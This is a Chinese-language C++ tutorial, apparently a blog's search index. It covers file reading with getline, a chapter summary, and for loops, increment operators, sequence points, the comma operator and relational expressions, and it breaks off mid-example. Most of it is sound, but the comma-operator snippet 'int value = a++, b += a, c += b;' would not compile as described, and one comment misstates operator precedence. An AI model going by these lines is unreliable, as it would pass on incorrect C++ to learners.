std::string line; std::vector&lt;std::string&gt; lines; // 3. 使用 getline 逐行读取 while (std::getline(inFile, line)) &#123; std::cout &lt;&lt; &quot;Read line: &quot; &lt;&lt; line &lt;&lt; std::endl; lines.push_back(line); // 将读取的行存入 vector &#125; // 检查循环是因为到达文件末尾还是发生错误 if (inFile.eof()) &#123; std::cout &lt;&lt; &quot;\\nReached end of file.&quot; &lt;&lt; std::endl; &#125; else if (inFile.fail()) &#123; std::cerr &lt;&lt; &quot;\\nError reading file (not EOF).&quot; &lt;&lt; std::endl; &#125; // 4. 关闭文件 inFile.close(); std::cout &lt;&lt; &quot;\\n--- Stored Lines ---&quot; &lt;&lt; std::endl; for(const std::string&amp; stored_line : lines) &#123; std::cout &lt;&lt; stored_line &lt;&lt; std::endl; &#125; // 示例：使用 &gt;&gt; 读取特定类型的数据 (假设文件格式已知) std::ifstream dataFile(&quot;report.txt&quot;); // 重新打开文件 if (!dataFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not reopen report.txt&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;\\nReading specific data using &gt;&gt; (may be fragile):&quot; &lt;&lt; std::endl; std::string header, productLabel, productName, qtyLabel; int quantity; double revenue; // 跳过第一行 std::getline(dataFile, header); // 读取第二行的数据 dataFile &gt;&gt; productLabel &gt;&gt; productName; // 读取第三行的数据 dataFile &gt;&gt; qtyLabel &gt;&gt; quantity; // 跳过第四行的 Revenue: 标签 std::string revenueLabel; dataFile &gt;&gt; revenueLabel &gt;&gt; revenue; if (dataFile) &#123; // 检查读取是否成功 std::cout &lt;&lt; &quot;Product: &quot; &lt;&lt; productName &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Quantity: &quot; &lt;&lt; quantity &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Revenue: &quot; &lt;&lt; revenue &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to parse data using &gt;&gt;&quot; &lt;&lt; std::endl; &#125; dataFile.close(); return 0;&#125; 代码解释: 第一个循环使用 std::getline() 读取文件的每一行，并将其打印出来，同时存储在 lines 向量中。while (std::getline(inFile, line)) 是读取文本文件的常用模式。 循环结束后，通过检查 inFile.eof() 和 inFile.fail() 可以判断循环是正常结束（到达文件末尾）还是因为其他错误。 第二个示例演示了使用 &gt;&gt; 操作符读取特定格式的数据。这种方法对于格式严格固定的文件可能有效，但如果文件格式稍有变化（例如多了空格），&gt;&gt; 就可能读取失败或读到错误的数据，因此通常不如 getline 健壮。需要仔细处理标签和数据类型。 文件 I/O 是 C++ 编程中非常重要的部分，它使得程序能够持久化数据，并与其他程序或系统进行交互。 6.9 总结本章介绍了 C++ 中用于控制程序流程的各种分支语句和相关概念，使得程序能够根据不同的条件执行不同的代码路径。 主要内容回顾： if 语句系列: if 语句：根据条件是否为真来决定是否执行某段代码。 if else 语句：提供两个代码路径，根据条件为真或假选择其一执行。 if else if else 结构：用于处理多个互斥的条件，提供多路分支选择。 逻辑运算符: || (逻辑或)：两个操作数中至少一个为真时，结果为真。 &amp;&amp; (逻辑与)：两个操作数都为真时，结果才为真。具有短路求值特性。 ! (逻辑非)：反转操作数的逻辑状态（真变假，假变真）。 cctype 库: 提供了一系列用于处理字符的函数，如 isalpha(), isdigit(), isspace(), ispunct(), toupper(), tolower() 等，方便进行字符分类和转换。 三元运算符 (?:): 提供了一种简洁的方式来根据条件选择两个值中的一个，是 if else 语句的一种紧凑替代形式，常用于简单的赋值操作。 语法：condition ? expression1 : expression2; switch 语句: 根据一个整数表达式的值，从多个 case 标签中选择一个匹配的执行点。 通常与 break 语句配合使用，以防止“贯穿”到下一个 case。 default 标签处理所有其他不匹配的情况。 case 标签必须是常量表达式。 适用于基于单个离散整数值的多路分支。 break 和 continue 语句: break：立即终止最内层的循环（for, while, do while）或 switch 语句。 continue：跳过当前循环迭代的剩余部分，直接开始下一次迭代（更新和条件检查）。 读取数字的循环: 演示了如何使用循环（如 while (cin &gt;&gt; value)）来连续读取数字输入。 强调了处理错误输入的重要性，包括使用 cin.clear() 清除错误状态和 cin.ignore() 丢弃无效输入，以编写更健壮的输入代码。 简单文件输入/输出: 引入了 &lt;fstream&gt; 库，用于文件操作。 ofstream：用于向文件写入数据（输出文件流），使用 &lt;&lt; 操作符。 ifstream：用于从文件读取数据（输入文件流），使用 &gt;&gt; 或 getline()。 强调了文件打开检查 (is_open()) 和关闭文件 (close() 或利用对象析构) 的重要性。 区分了文本 I/O 和二进制 I/O 的基本概念。 通过掌握这些分支结构和控制语句，可以编写出能够响应不同情况、处理用户输入和文件数据的更复杂、更灵活的 C++ 程序。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 5 循环和关系表达式","slug":"Cpp_tutorial_Chapter_5","date":"2025-04-26T12:03:35.373Z","updated":"2025-04-26T12:01:40.288Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_5/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_5/","excerpt":"","text":"5.1 for循环循环是编程中的基本控制结构，它允许我们重复执行一段代码，直到满足某个条件为止。for 循环是 C++ 中最常用的循环结构之一，特别适用于已知循环次数或需要按特定步长迭代的情况。 5.1.1 for循环的组成部分for 循环的头部包含三个由分号 ; 分隔的部分，控制着循环的执行流程： 初始化 (Initialization): 在循环开始前执行一次。 通常用于声明和/或初始化循环控制变量（计数器）。 可以包含多条语句，用逗号分隔（见 5.1.11）。 也可以为空。 测试条件 (Test Condition / Condition): 在每次循环迭代开始前进行求值。 结果必须是一个布尔值 (true 或 false) 或可以转换为布尔值（非零为 true，零为 false）。 如果条件为 true，则执行循环体。 如果条件为 false，则循环终止，程序继续执行循环后面的语句。 也可以为空，空条件被视为 true，形成无限循环（需要其他方式跳出，如 break）。 更新 (Update / Increment / Decrement): 在每次循环迭代结束时（执行完循环体之后，下次测试条件之前）执行。 通常用于修改循环控制变量（例如，递增或递减计数器）。 可以包含多条语句，用逗号分隔。 也可以为空。 语法: 123456789for (initialization; test_condition; update) &#123; // 循环体 (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125; // 或者如果循环体只有一条语句，可以省略花括号for (initialization; test_condition; update) single_statement; 执行流程: 执行 initialization。 计算 test_condition。 如果 test_condition 为 false，跳出循环，执行循环后面的代码。 如果 test_condition 为 true，执行循环体中的语句。 执行 update。 回到步骤 2。 示例: 12345678910111213141516#include &lt;iostream&gt;int main() &#123; // 打印数字 0 到 4 for (int i = 0; // 1. 初始化: 声明并初始化计数器 i 为 0 i &lt; 5; // 2. 测试条件: 只要 i 小于 5 就继续 i = i + 1) // 4. 更新: 每次循环后将 i 增加 1 &#123; // 3. 循环体 std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Loop finished.&quot; &lt;&lt; std::endl; return 0;&#125; 5.1.2 回到for循环for 循环提供了一种非常结构化的方式来编写计数循环。上面的例子展示了一个典型的从 0 开始计数到某个值之前的循环。 基本计数循环示例: 12345678910111213141516171819#include &lt;iostream&gt;int main() &#123; // 计算 1 到 10 的和 int sum = 0; for (int i = 1; i &lt;= 10; i = i + 1) &#123; // 从 1 开始，包含 10 sum = sum + i; &#125; std::cout &lt;&lt; &quot;Sum of 1 to 10 is: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出 55 // 倒序打印 5 到 1 std::cout &lt;&lt; &quot;Countdown:&quot; &lt;&lt; std::endl; for (int count = 5; count &gt; 0; count = count - 1) &#123; std::cout &lt;&lt; count &lt;&lt; &quot;...&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Liftoff!&quot; &lt;&lt; std::endl; return 0;&#125; 5.1.3 修改步长for 循环的更新部分不一定总是加 1 或减 1。你可以根据需要指定任何有效的更新表达式。 示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; // 以步长 2 递增，打印偶数 std::cout &lt;&lt; &quot;Even numbers less than 10:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 10; i = i + 2) &#123; std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出 0 2 4 6 8 // 以步长 5 递减 std::cout &lt;&lt; &quot;Counting down by 5s:&quot; &lt;&lt; std::endl; for (int n = 50; n &gt;= 0; n = n - 5) &#123; std::cout &lt;&lt; n &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出 50 45 40 35 30 25 20 15 10 5 0 // 使用乘法作为步长 (注意避免无限循环) std::cout &lt;&lt; &quot;Powers of 2 less than 100:&quot; &lt;&lt; std::endl; for (int p = 1; p &lt; 100; p = p * 2) &#123; std::cout &lt;&lt; p &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出 1 2 4 8 16 32 64 return 0;&#125; 5.1.4 使用for循环访问字符串for 循环是遍历字符串（无论是 C 风格字符串还是 std::string 对象）中每个字符的常用方法。 示例 (C 风格字符串): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strlen()int main() &#123; char message[] = &quot;Hello&quot;; int len = strlen(message); // 获取字符串长度 (不包括 \\0) std::cout &lt;&lt; &quot;Characters in \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; len; i = i + 1) &#123; // 索引从 0 到 len-1 std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; message[i] &lt;&lt; std::endl; &#125; // 也可以使用指针和空字符判断 std::cout &lt;&lt; &quot;Characters using pointer:&quot; &lt;&lt; std::endl; for (char *p = message; *p != &#x27;\\0&#x27;; p = p + 1) &#123; std::cout &lt;&lt; *p &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 示例 (std::string): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string word = &quot;World&quot;; std::cout &lt;&lt; &quot;Characters in \\&quot;&quot; &lt;&lt; word &lt;&lt; &quot;\\&quot;:&quot; &lt;&lt; std::endl; // 使用 size() 获取长度，size_t 通常是合适的索引类型 for (size_t i = 0; i &lt; word.size(); i = i + 1) &#123; std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; word[i] &lt;&lt; std::endl; &#125; // C++11 基于范围的 for 循环 (更简洁，见 5.4) // std::cout &lt;&lt; &quot;Characters using range-based for:&quot; &lt;&lt; std::endl; // for (char ch : word) &#123; // std::cout &lt;&lt; ch &lt;&lt; &quot; &quot;; // &#125; // std::cout &lt;&lt; std::endl; return 0;&#125; 5.1.5 递增运算符（++）和递减运算符（–）C++ 提供了两个非常有用的运算符来简化变量加 1 或减 1 的操作： 递增运算符 (++): 将操作数的值增加 1。 递减运算符 (--): 将操作数的值减少 1。 它们可以用于整数类型、浮点类型和指针类型。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int count = 5; double value = 10.5; // 递增 count++; // 等价于 count = count + 1; 现在 count 是 6 ++value; // 等价于 value = value + 1; 现在 value 是 11.5 std::cout &lt;&lt; &quot;Count after increment: &quot; &lt;&lt; count &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value after increment: &quot; &lt;&lt; value &lt;&lt; std::endl; // 递减 count--; // 等价于 count = count - 1; 现在 count 是 5 --value; // 等价于 value = value - 1; 现在 value 是 10.5 std::cout &lt;&lt; &quot;Count after decrement: &quot; &lt;&lt; count &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value after decrement: &quot; &lt;&lt; value &lt;&lt; std::endl; // 在 for 循环中使用 std::cout &lt;&lt; &quot;Loop using ++:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 3; ++i) &#123; // 使用 ++i 或 i++ 效果相同 (作为独立语句) std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; std::endl; &#125; return 0;&#125; 5.1.6 副作用和顺序点副作用 (Side Effect): 指的是修改变量的值或执行 I/O 操作等改变程序状态的行为。递增 (++) 和递减 (--) 运算符都具有副作用，因为它们会修改操作数的值。 顺序点 (Sequence Point): 是程序执行过程中的一个时间点，在该点之前的所有副作用都已完成，并且后续的副作用尚未发生。C++ 标准定义了一些顺序点，例如： 分号 ; (语句结束处) 完整表达式结束时（如 if 条件、while 条件、for 循环的三个部分之后） 函数调用之前（所有参数的副作用完成） 某些运算符（如 &amp;&amp;, ||, , 逗号运算符）的特定位置 重要性: 在两个顺序点之间，不要对同一个变量进行多次修改，或者既修改它又读取它（除了读取它的值以计算要写入的值之外）。否则，行为是**未定义的 (Undefined Behavior)**，编译器可能产生任何结果。 示例 (未定义行为): 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int x = 5; int y; // 未定义行为: 在同一表达式中多次修改 x，且没有顺序点分隔 // y = (x++) * (x++); // 不要这样写! 结果不可预测 // y = x + (++x); // 不要这样写! 结果不可预测 // std::cout &lt;&lt; x &lt;&lt; (++x); // 不要这样写! 输出顺序和 x 的最终值不可预测 // 安全的写法: 使用顺序点分隔副作用 y = x++; // y 获取 x 的原始值 5, 然后 x 变为 6 (副作用在分号处完成) std::cout &lt;&lt; &quot;y = &quot; &lt;&lt; y &lt;&lt; &quot;, x = &quot; &lt;&lt; x &lt;&lt; std::endl; // 输出 y = 5, x = 6 y = ++x; // x 先变为 7, 然后 y 获取新值 7 (副作用在分号处完成) std::cout &lt;&lt; &quot;y = &quot; &lt;&lt; y &lt;&lt; &quot;, x = &quot; &lt;&lt; x &lt;&lt; std::endl; // 输出 y = 7, x = 7 return 0;&#125; 结论: 避免在单个表达式中对同一变量产生复杂的、依赖于副作用顺序的操作。将它们分解成多个语句通常更安全、更清晰。 5.1.7 前缀格式和后缀格式递增 (++) 和递减 (--) 运算符都有两种使用形式： 前缀 (Prefix): 运算符放在操作数之前 (++x, --x)。 行为: 先修改操作数的值（加 1 或减 1），然后使用修改后的值作为整个表达式的结果。 后缀 (Postfix): 运算符放在操作数之后 (x++, x--)。 行为: 先使用操作数的原始值作为整个表达式的结果，然后再修改操作数的值（加 1 或减 1）。 区别在于表达式的值: 表达式 行为描述 表达式的值 操作数最终值 ++x 先将 x 加 1 x 的新值 新值 x++ 先使用 x 的原始值 x 的原始值 新值 --x 先将 x 减 1 x 的新值 新值 x-- 先使用 x 的原始值 x 的原始值 新值 用法与示例: 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;int main() &#123; int a = 5, b = 5; int result_a, result_b; // 前缀递增 result_a = ++a; // a 先变成 6, 然后 result_a 被赋值为 6 std::cout &lt;&lt; &quot;Prefix: result_a = &quot; &lt;&lt; result_a &lt;&lt; &quot;, a = &quot; &lt;&lt; a &lt;&lt; std::endl; // 输出 6, 6 // 后缀递增 result_b = b++; // result_b 先被赋值为 b 的原始值 5, 然后 b 变成 6 std::cout &lt;&lt; &quot;Postfix: result_b = &quot; &lt;&lt; result_b &lt;&lt; &quot;, b = &quot; &lt;&lt; b &lt;&lt; std::endl; // 输出 5, 6 // 在 for 循环更新部分，通常前缀和后缀效果相同 // 但在复杂表达式中，它们的区别很重要 int arr[] = &#123;10, 20, 30&#125;; int index = 0; // 使用后缀获取值并移动索引 int val1 = arr[index++]; // val1 = arr[0] (10), index 变为 1 std::cout &lt;&lt; &quot;val1 = &quot; &lt;&lt; val1 &lt;&lt; &quot;, index = &quot; &lt;&lt; index &lt;&lt; std::endl; // 使用前缀移动索引并获取值 index = 0; // 重置 index int val2 = arr[++index]; // index 先变为 1, val2 = arr[1] (20) std::cout &lt;&lt; &quot;val2 = &quot; &lt;&lt; val2 &lt;&lt; &quot;, index = &quot; &lt;&lt; index &lt;&lt; std::endl; return 0;&#125; 性能建议: 对于内置类型（如 int, double, 指针），前缀和后缀的性能差异通常可以忽略。但对于用户定义的类类型（迭代器等），前缀形式 (++it) 通常比后缀形式 (it++) 效率更高，因为后缀形式需要创建一个临时对象来保存原始值。因此，在不需要使用原始值的情况下，养成优先使用前缀递增/递减的习惯是好的。 5.1.8 递增/递减运算符和指针++ 和 -- 运算符可以应用于指针，其效果是使指针指向内存中的下一个或上一个元素。编译器会自动根据指针指向的数据类型的大小来调整地址。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;int main() &#123; double arr[3] = &#123;1.1, 2.2, 3.3&#125;; double *ptr = arr; // ptr 指向 arr[0] std::cout &lt;&lt; &quot;Initial pointer: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 1.1 // 前缀递增指针 ++ptr; std::cout &lt;&lt; &quot;After ++ptr: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 2.2 // 后缀递增指针 ptr++; std::cout &lt;&lt; &quot;After ptr++: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 3.3 // 前缀递减指针 --ptr; std::cout &lt;&lt; &quot;After --ptr: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 2.2 // 后缀递减指针 ptr--; std::cout &lt;&lt; &quot;After ptr--: &quot; &lt;&lt; ptr &lt;&lt; &quot;, value: &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 指向 1.1 // 结合解引用 (注意优先级) ptr = arr; // 重置 double val; // *ptr++ : 获取 ptr 当前指向的值，然后 ptr 指向下一个元素 (后缀 ++ 优先级高于 *) val = *ptr++; std::cout &lt;&lt; &quot;val = *ptr++ : val = &quot; &lt;&lt; val &lt;&lt; &quot;, ptr now points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // val=1.1, ptr 指向 2.2 // *++ptr : ptr 先指向下一个元素，然后获取新指向的值 (前缀 ++ 优先级高于 *) ptr = arr; // 重置 val = *++ptr; std::cout &lt;&lt; &quot;val = *++ptr : val = &quot; &lt;&lt; val &lt;&lt; &quot;, ptr now points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // val=2.2, ptr 指向 2.2 // ++*ptr : 获取 ptr 指向的值，然后将该值加 1 (解引用 * 优先级高于前缀 ++) ptr = arr; // 重置 ++*ptr; // 将 arr[0] 的值从 1.1 增加到 2.1 std::cout &lt;&lt; &quot;After ++*ptr : arr[0] = &quot; &lt;&lt; arr[0] &lt;&lt; &quot;, ptr points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // arr[0]=2.1, ptr 指向 2.1 // (*ptr)++ : 获取 ptr 指向的值，然后将该值加 1 (括号强制先解引用) ptr = arr; // 重置 arr[0] = 1.1; // 恢复 arr[0] (*ptr)++; // 将 arr[0] 的值从 1.1 增加到 2.1 std::cout &lt;&lt; &quot;After (*ptr)++: arr[0] = &quot; &lt;&lt; arr[0] &lt;&lt; &quot;, ptr points to value &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // arr[0]=2.1, ptr 指向 2.1 return 0;&#125; 优先级: 解引用 * 和前/后缀 ++/-- 的优先级相同，结合性是从右到左。为了清晰起见，当结合使用时，使用括号 () 是个好主意，例如 (*ptr)++。 5.1.9 组合赋值运算符C++ 提供了一组组合赋值运算符，将算术运算和赋值运算合并为一个运算符，使代码更简洁。 运算符 示例 等价于 += x += y x = x + y -= x -= y x = x - y *= x *= y x = x * y /= x /= y x = x / y %= x %= y x = x % y &amp;= x &amp;= y x = x &amp; y ` =` `x ^= x ^= y x = x ^ y &lt;&lt;= x &lt;&lt;= y x = x &lt;&lt; y &gt;&gt;= x &gt;&gt;= y x = x &gt;&gt; y 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; int score = 100; int bonus = 10; int penalty = 5; int factor = 2; score += bonus; // score = score + bonus; score 变为 110 std::cout &lt;&lt; &quot;Score after bonus: &quot; &lt;&lt; score &lt;&lt; std::endl; score -= penalty; // score = score - penalty; score 变为 105 std::cout &lt;&lt; &quot;Score after penalty: &quot; &lt;&lt; score &lt;&lt; std::endl; score *= factor; // score = score * factor; score 变为 210 std::cout &lt;&lt; &quot;Score after factor: &quot; &lt;&lt; score &lt;&lt; std::endl; score /= 3; // score = score / 3; score 变为 70 (整数除法) std::cout &lt;&lt; &quot;Score after division: &quot; &lt;&lt; score &lt;&lt; std::endl; score %= 8; // score = score % 8; score 变为 6 (70 除以 8 余 6) std::cout &lt;&lt; &quot;Score after modulo: &quot; &lt;&lt; score &lt;&lt; std::endl; // 在 for 循环更新中使用 int total = 0; for (int i = 1; i &lt;= 5; ++i) &#123; total += i; // 累加 &#125; std::cout &lt;&lt; &quot;Total (1-5): &quot; &lt;&lt; total &lt;&lt; std::endl; // 输出 15 return 0;&#125; 组合赋值运算符通常更易读，并且可能比分开写稍微高效一些。 5.1.10 复合语句（语句块）复合语句 (Compound Statement) 或 语句块 (Block) 是由一对花括号 &#123;&#125; 括起来的零条或多条语句。 作用: 语法需要: 在 C++ 语法要求只能出现一条语句的地方（例如 if, else, for, while 的循环体），可以使用语句块来包含多条语句。 创建作用域: 语句块会创建一个新的**局部作用域 (Local Scope)**。在块内声明的变量（自动存储变量）只在该块内部可见，并在块结束时销毁。 用法与示例: 12345678910111213141516171819202122#include &lt;iostream&gt;int main() &#123; int x = 10; if (x &gt; 5) &#123; // if 后面需要一条语句，这里使用语句块 std::cout &lt;&lt; &quot;x is greater than 5.&quot; &lt;&lt; std::endl; int y = x * 2; // y 只在 if 块内部可见 std::cout &lt;&lt; &quot;Double x is: &quot; &lt;&lt; y &lt;&lt; std::endl; &#125; // y 在这里销毁 // std::cout &lt;&lt; y; // 错误! y 在此作用域不可见 std::cout &lt;&lt; &quot;Loop with block:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 2; ++i) &#123; // for 循环体使用语句块 std::cout &lt;&lt; &quot; Outer loop i = &quot; &lt;&lt; i &lt;&lt; std::endl; int j = i + 10; // j 只在 for 循环的当前迭代块内可见 std::cout &lt;&lt; &quot; Inner variable j = &quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // 每次迭代结束时 j 销毁 return 0;&#125; 5.1.11 其他语法技巧——逗号运算符逗号运算符 (,) 是 C++ 中优先级最低的运算符。它允许将两个表达式连接成一个表达式。 行为: 先计算逗号左侧的表达式。 丢弃左侧表达式的计算结果。 然后计算逗号右侧的表达式。 整个逗号表达式的结果是右侧表达式的值和类型。 主要用途: for 循环的初始化和更新部分: 允许在这些部分执行多个操作，而不需要语句块。 (较少见) 在需要单个表达式的地方执行多个有副作用的操作。 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // 在 for 循环中使用逗号运算符 int i, j; std::cout &lt;&lt; &quot;Using comma in for loop:&quot; &lt;&lt; std::endl; for (i = 0, j = 10; // 初始化: 初始化 i 和 j i &lt; j; // 条件 ++i, --j) // 更新: 递增 i, 递减 j &#123; std::cout &lt;&lt; &quot;i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // 逗号表达式的值 int x; int result = (x = 5, x + 10); // x 先被赋值为 5, 然后计算 x+10 (15) // 整个表达式的结果是 15 std::cout &lt;&lt; &quot;Result of comma expression: &quot; &lt;&lt; result &lt;&lt; std::endl; // 输出 15 std::cout &lt;&lt; &quot;x after comma expression: &quot; &lt;&lt; x &lt;&lt; std::endl; // 输出 5 // 优先级最低 int a = 1, b = 2, c = 3; int value = a++, b += a, c += b; // 逗号优先级低于赋值 // 这实际上等价于: value = a++; (value=1, a=2) 然后计算 b+=a (b=2+2=4), 然后计算 c+=b (c=3+4=7) std::cout &lt;&lt; &quot;value=&quot; &lt;&lt; value &lt;&lt; &quot;, a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; // 输出 value=1, a=2, b=4, c=7 // 如果想按顺序执行并取最后结果，需要括号 value = (++a, b += a, c += b); // a=3, b=4+3=7, c=7+7=14. value=14 std::cout &lt;&lt; &quot;value=&quot; &lt;&lt; value &lt;&lt; &quot;, a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; // 输出 value=14, a=3, b=7, c=14 return 0;&#125; 虽然逗号运算符提供了这种能力，但过度使用可能降低代码的可读性。在 for 循环的初始化和更新部分是其最常见且合理的用途。 5.1.12 关系表达式关系表达式 (Relational Expression) 使用关系运算符来比较两个操作数的值，其结果是一个布尔值 (true 或 false)。 关系运算符: &lt; : 小于 (Less than) &gt; : 大于 (Greater than) &lt;=: 小于或等于 (Less than or equal to) &gt;=: 大于或等于 (Greater than or equal to) ==: 等于 (Equal to) !=: 不等于 (Not equal to) 这些运算符的优先级低于算术运算符，但高于赋值运算符。== 和 != 的优先级低于其他四个关系运算符。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int score = 85; int passing_score = 60; double temp1 = 36.5, temp2 = 37.0; bool isPassing = (score &gt;= passing_score); // 比较 score 是否大于等于 passing_score bool isFever = (temp1 &gt; temp2); // 比较 temp1 是否大于 temp2 bool isEqual = (score == 85); // 比较 score 是否等于 85 bool isNotEqual = (temp1 != temp2); // 比较 temp1 是否不等于 temp2 std::cout &lt;&lt; std::boolalpha; // 使 bool 输出为 true/false std::cout &lt;&lt; &quot;Score: &quot; &lt;&lt; score &lt;&lt; &quot;, Passing Score: &quot; &lt;&lt; passing_score &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Is passing? &quot; &lt;&lt; isPassing &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;Is fever? &quot; &lt;&lt; isFever &lt;&lt; std::endl; // 输出 false std::cout &lt;&lt; &quot;Is score 85? &quot; &lt;&lt; isEqual &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;Temps not equal? &quot; &lt;&lt; isNotEqual &lt;&lt; std::endl; // 输出 true // 在循环条件中使用 int count = 0; while (count &lt; 3) &#123; // 当 count 小于 3 时循环 std::cout &lt;&lt; &quot;Count is &quot; &lt;&lt; count &lt;&lt; std::endl; count++; &#125; return 0;&#125; 5.1.13 赋值、比较和可能犯的错误一个非常常见的 C++ 编程错误是将赋值运算符 (=) 误用在需要比较运算符 (==) 的地方，尤其是在 if 或 while 的条件语句中。 if (x = 5): 这不是比较 x 是否等于 5。它的作用是： 将 5 赋给变量 x。 整个赋值表达式 (x = 5) 的结果是赋给 x 的值，即 5。 在 if 条件中，非零值被视为 true。因此，这个 if 语句总是会执行其代码块（除非 5 被视为 false，这在 C++ 中不会发生），并且还会意外地将 x 的值修改为 5。 if (x == 5): 这才是正确的比较，检查 x 的当前值是否等于 5，结果为 true 或 false，并且不会修改 x 的值。 示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int score = 0; std::cout &lt;&lt; &quot;Enter your score: &quot;; std::cin &gt;&gt; score; // 错误: 使用了赋值 = if (score = 100) &#123; // 总是 true，并且 score 被改为 100 std::cout &lt;&lt; &quot;Mistake: You entered 100 (or maybe not, score is now 100).&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Mistake: This part will likely never execute.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Score after mistaken if: &quot; &lt;&lt; score &lt;&lt; std::endl; // score 总是 100 // 正确: 使用了比较 == std::cout &lt;&lt; &quot;\\nEnter your score again: &quot;; std::cin &gt;&gt; score; if (score == 100) &#123; // 正确比较 std::cout &lt;&lt; &quot;Correct: Perfect score!&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Correct: Score is not 100.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Score after correct if: &quot; &lt;&lt; score &lt;&lt; std::endl; // score 保持用户输入的值 return 0;&#125; 如何避免: 仔细检查条件语句中的 = 和 ==。 一些编码风格建议将常量放在比较运算符的左边（”Yoda conditions”），例如 if (100 == score)。这样如果意外写成 if (100 = score)，编译器会报错，因为不能给常量赋值。 5.1.14 C风格字符串的比较对于 C 风格字符串（char 数组或 char* 指针），不能直接使用关系运算符（==, !=, &lt;, &gt; 等）来比较字符串的内容。 当对两个 char* 指针使用 == 或 != 时，比较的是指针存储的内存地址，而不是它们指向的字符串内容。 要比较 C 风格字符串的内容，需要使用 C 字符串库 &lt;cstring&gt; (或 C 的 &lt;string.h&gt;) 中提供的函数，主要是 strcmp()。 strcmp(str1, str2): 如果 str1 按字典序等于 str2，返回 0。 如果 str1 小于 str2，返回负值。 如果 str1 大于 str2，返回正值。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strcmp()int main() &#123; char word1[] = &quot;apple&quot;; char word2[] = &quot;apply&quot;; char word3[] = &quot;apple&quot;; const char *p1 = &quot;banana&quot;; const char *p2 = &quot;banana&quot;; // 编译器可能将相同的字面值存储在同一地址 const char *p3 = word1; // 错误: 比较地址 if (word1 == word3) &#123; // 比较两个不同数组的地址，结果通常是 false std::cout &lt;&lt; &quot;Mistake: word1 == word3 (comparing addresses)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Mistake: word1 != word3 (comparing addresses)&quot; &lt;&lt; std::endl; &#125; if (p1 == p2) &#123; // 